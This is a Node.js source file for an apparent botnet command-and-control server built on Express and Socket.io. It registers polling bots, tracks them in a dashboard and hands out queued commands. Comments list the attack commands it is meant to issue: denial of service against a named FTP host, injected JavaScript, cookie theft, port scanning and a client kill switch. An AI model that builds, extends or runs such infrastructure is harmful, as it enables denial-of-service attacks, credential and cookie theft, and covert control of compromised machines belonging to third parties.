var app = require('express')(),
    http = require('http').Server(app),
    io = require('socket.io')(http),
    config = require('./config.json'),
    exphbs  = require('express-handlebars'),
    bots = {},
    //    currCommand = {};
    //     currCommand = {DOS: {prot:'http', host: "ftp.ladder.com", port: "21" } };
    //     currCommand = {injectJs: "console.log('you got hacked')" };
    currCommand = {killClient: true };

app.engine('handlebars', exphbs({defaultLayout: 'main'}));
app.set('view engine', 'handlebars');

// express loads the homepage
app.get('/', function (req, res) {
    console.log('Requesed Force Commander')
    res.render('index', { name: 'Tobi',bots:bots,layout: false });
});
// bot get command
app.get('/commands/get/:id', function (req, res) {
    var id = req.params.id;
    res.json(currCommand);
    console.log('Bot : ',id, ' Request Commands: ', currCommand)
    if(!bots[id]){
        io.sockets.emit('bot-join', { id: id });
        bots[id] = true;
        console.log('New Bot: ',  id);
    }
    currCommand = {};
});
// from force command
app.route('/command/send')
    .get(function(req, res, next) {
    //  res.json(...);
}).post(function(req, res, next) {
    // maybe add a new event...
});
io.on('connection', function(socket){
    console.log('Force commander connected');
    socket.on('cmd', function(cmd){
        // when the force commander sends a command
        console.log('message: ' + cmd);
    });
});

http.listen(config.listenPort, function(){
    console.log('Command and control center listening on http://localhost:%s', config.listenPort);
});
// list of attacks
// dos
// injectJs: “console.log(‘PAWNEEd’)”,
//	getCookies: true,
//	srvScann: { host: “ftp.ladder.com”, port: “21” },
//killClient: true
